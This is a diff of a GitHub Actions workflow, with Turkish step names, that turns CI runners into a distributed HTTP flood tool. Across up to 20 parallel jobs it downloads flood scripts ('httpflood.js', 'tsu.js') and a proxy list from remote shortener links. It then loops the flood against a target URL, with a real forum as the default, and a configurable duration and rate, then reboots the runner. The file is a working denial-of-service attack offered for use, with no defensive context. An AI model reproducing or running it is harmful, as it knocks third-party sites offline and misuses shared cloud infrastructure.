@@ -1,36 +1,53 @@
-name: Ubuntu VDS 50 saniye flod
-
+name: era7
 on:
   workflow_dispatch:
+    inputs:
+      target:
+        description: "URL"
+        required: true
+        default: "https://www.r10.net/"
+      time:
+        description: "Time)"
+        required: true
+        default: "115"
+      rate:
+        description: "Rate"
+        required: true
+        default: "100"
 
 jobs:
   vds:
     runs-on: ubuntu-latest
     strategy:
-      max-parallel: 25
+      max-parallel: 20
       matrix:
-        instance: [1, 2, 3, 4, 5]
-
-
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+    
     steps:
-      - name: OK !
-        run: |
-          wget https://curl.by/wheCZ/httpflood.js
-          wget https://curl.by/ILl73/fres.txt
-          npm install fake-useragent colors
-          chmod +x httpflood.js
-          PIDS=()
-          for i in {1..100}; do
-            timeout 85 node httpflood.js GET https://antiddos.ooguy.com/ fres.txt 83 90 12
-            PIDS+=($!)
-          done
-          
-          for pid in "${PIDS[@]}"; do
-            wait $pid
-          done
-
-      - name: OK !
-        run: sleep 85
+    - name: Dosyaları indir ve hazırla
+      run: |
+        wget https://curl.by/jp3x9/tsu.js
+        wget https://curl.by/oFqXg/fres.txt
+        chmod +x tsu.js
+        npm i hpack https commander colors socks
+    - name: run
+      run: |
+        TARGET="${{ inputs.target }}"
+        TIME="${{ inputs.time }}"
+        RATE="${{ inputs.rate }}"
         
-      - name: OK !
-        run: sudo reboot
+        PIDS=()
+        for i in {1..96}; do
+          sudo timeout $TIME node tsu.js "$TARGET" 900 "$RATE" 10 fres.txt
+          PIDS+=($!)
+        done
+        
+        for pid in "${PIDS[@]}"; do
+          wait $pid
+        done
+    
+    - name: Bekleme
+      run: sleep ${{ inputs.time }}
+    
+    - name: Sistemi yeniden başlat
+      run: sudo reboot
